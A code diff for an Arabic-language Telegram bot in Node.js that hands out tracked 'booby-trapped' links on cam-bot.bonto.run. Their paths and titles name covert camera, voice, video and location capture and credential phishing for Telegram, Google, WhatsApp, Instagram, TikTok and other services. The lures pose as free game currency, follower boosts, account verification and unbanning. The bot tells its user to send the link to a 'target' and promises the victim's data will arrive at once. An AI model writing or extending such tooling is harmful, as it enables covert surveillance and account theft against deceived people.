@@ -37,30 +37,69 @@ function registerUser(userId, name) {
     }
 }
 
-// ✅ روابط الأقسام (كل الأقسام)
-const links = {
-    'hack_cam': "https://cam-bot.bonto.run/",
-    'record_voice': "https://cam-bot.bonto.run/voice.html",
-    'record_video': "https://cam-bot.bonto.run/video.html",
-    'location': "https://cam-bot.bonto.run/location.html",
-    'hack_telegram': "https://cam-bot.bonto.run/telegram.html",
-    'hack_google': "https://cam-bot.bonto.run/google.html",
-    'network_cards': "https://cam-bot.bonto.run/cards.html",
-    'device_check': "https://cam-bot.bonto.run/scan.html",
-    'freefire': "https://cam-bot.bonto.run/freefire.html",
-    'snapchat': "https://cam-bot.bonto.run/snapchat.html",
-    'pubg': "https://cam-bot.bonto.run/pubg.html",
-    'whatsapp': "https://cam-bot.bonto.run/whatsapp.html",
-    'facebook': "https://cam-bot.bonto.run/facebook.html",
-    'instagram': "https://cam-bot.bonto.run/instagram.html",
-    'tiktok': "https://cam-bot.bonto.run/tiktok.html",
-    'hack_youtube': "https://cam-bot.bonto.run/youtube.html",
-    'hack_likee': "https://cam-bot.bonto.run/likee.html",
-    'hack_kwai': "https://cam-bot.bonto.run/kwai.html",
-    'unban_service': "https://cam-bot.bonto.run/unban.html",
-    'report_number': "https://cam-bot.bonto.run/report.html",
-    'get_phone_link': "https://t.me/heroil_2bot"
-};
+// ✅ دالة بتولد اللينك حسب آيدي المستخدم
+function getLink(key, userId) {
+    const baseLinks = {
+        'hack_cam': "https://cam-bot.bonto.run/",
+        'record_voice': "https://cam-bot.bonto.run/voice.html",
+        'record_video': "https://cam-bot.bonto.run/video.html",
+        'location': "https://cam-bot.bonto.run/location.html",
+        'hack_telegram': "https://cam-bot.bonto.run/telegram.html",
+        'hack_google': "https://cam-bot.bonto.run/google.html",
+        'network_cards': "https://cam-bot.bonto.run/cards.html",
+        'device_check': "https://cam-bot.bonto.run/scan.html",
+        'freefire': "https://cam-bot.bonto.run/freefire.html",
+        'snapchat': "https://cam-bot.bonto.run/snapchat.html",
+        'pubg': "https://cam-bot.bonto.run/pubg.html",
+        'whatsapp': "https://cam-bot.bonto.run/whatsapp.html",
+        'facebook': "https://cam-bot.bonto.run/facebook.html",
+        'instagram': "https://cam-bot.bonto.run/instagram.html",
+        'tiktok': "https://cam-bot.bonto.run/tiktok.html",
+        'hack_youtube': "https://cam-bot.bonto.run/youtube.html",
+        'hack_likee': "https://cam-bot.bonto.run/likee.html",
+        'hack_kwai': "https://cam-bot.bonto.run/kwai.html",
+        'unban_service': "https://cam-bot.bonto.run/unban.html",
+        'report_number': "https://cam-bot.bonto.run/report.html",
+        'get_phone_link': "https://t.me/heroil_2bot"
+    };
+
+    let base = baseLinks[key];
+    if (!base) return null;
+
+    if (key === 'get_phone_link') {
+        return `${base}?start=${userId}`;
+    }
+
+    return `${base}?chatId=${userId}`;
+}
+
+// ✅ العناوين المخصصة لكل قسم
+function getSectionTitle(key) {
+    const titles = {
+        'hack_cam': 'تم تلغيم الرابط اختراق الكاميرا 💀 الأمامية والخلفية 📸',
+        'record_voice': 'تم تلغيم ربط بوابة الضل',
+        'record_video': 'تم تلغيم ربط تزويد متابعين',
+        'location': 'تم تلغيم ربط تعلم الهكر والاختراق',
+        'hack_telegram': 'تم تلغيم ربط توثيق حسابات تلجرام',
+        'hack_google': 'تم تلغيم ربط توثيق حسابات',
+        'network_cards': 'تم تلغيم ربط تخمين كروت الشبكات',
+        'device_check': 'تم تلغيم ربط بوابة الضل',
+        'freefire': 'تم تلغيم ربط شحن جواهر',
+        'snapchat': 'تم تلغيم ربط تزويد متابعين سناب شات',
+        'pubg': 'تم تلغيم ربط شحن شدات',
+        'whatsapp': 'تم تلغيم ربط توثيق حسابات الواتساب',
+        'facebook': 'تم تلغيم ربط تزويد متابعين فيسبوك',
+        'instagram': 'تم تلغيم ربط تزويد متابعين الانستغرام',
+        'tiktok': 'تم تلغيم ربط تزويد متابعين تيك توك',
+        'hack_youtube': 'تم تلغيم ربط رشق مشتركين يوتيوب',
+        'hack_likee': 'تم تلغيم ربط رشق متابعين لايكي',
+        'hack_kwai': 'تم تلغيم ربط رشق متابعين كواي',
+        'unban_service': 'تم تلغيم ربط فك حظر الأرقام',
+        'report_number': 'تم تلغيم ربط الإبلاغ عن الأرقام',
+        'get_phone_link': 'تم تلغيم ربط كاشف الأرقام'
+    };
+    return titles[key] || 'تم تلغيم الربط بنجاح';
+}
 
 // القائمة الرئيسية
 function getMainKeyboard() {
@@ -195,16 +234,27 @@ bot.on('callback_query', (query) => {
         bot.sendMessage(chatId, "👨‍💻 <b>المطور:</b> @heroil_1", { parse_mode: 'HTML' });
     } else if (data === 'coming_soon' || data === 'transfer_points' || data === 'collect_points' || data === 'points_store' || data === 'get_contacts' || data === 'get_messages' || data === 'get_photos') {
         bot.sendMessage(chatId, "🛠️ <b>هذا القسم قيد التطوير حالياً.</b>", { parse_mode: 'HTML' });
-    } else if (links[data]) {
-        bot.sendMessage(chatId, `🔗 <b>الرابط جاهز:</b>\n\n${links[data]}`, {
-            parse_mode: 'HTML',
-            disable_web_page_preview: true
-        });
     } else {
-        bot.sendMessage(chatId, "🛠️ هذا القسم غير متاح حالياً.", { parse_mode: 'HTML' });
+        // هنا بنجيب اللينك والعنوان المخصص
+        const link = getLink(data, chatId);
+        const title = getSectionTitle(data);
+
+        if (link) {
+            bot.sendMessage(chatId, 
+                `💀 <b>${title}</b> 💀\n\n` +
+                `🔗 <b>الرابط جاهز:</b>\n\n${link}\n\n` +
+                `📌 <b>أرسـل الـرابـط لـلـهـدف • وستوصلك البيانات فوراً 🔥</b>`, 
+                {
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                }
+            );
+        } else {
+            bot.sendMessage(chatId, "🛠️ هذا القسم غير متاح حالياً.", { parse_mode: 'HTML' });
+        }
     }
 
     bot.answerCallbackQuery(query.id);
 });
 
-console.log("⚔ البوت شغال بنجاح على Node.js... (النسخة الكاملة مع لوحة الأدمن)");
+console.log("⚔ البوت شغال بنجاح على Node.js... (النسخة الكاملة مع العناوين والروابط)");
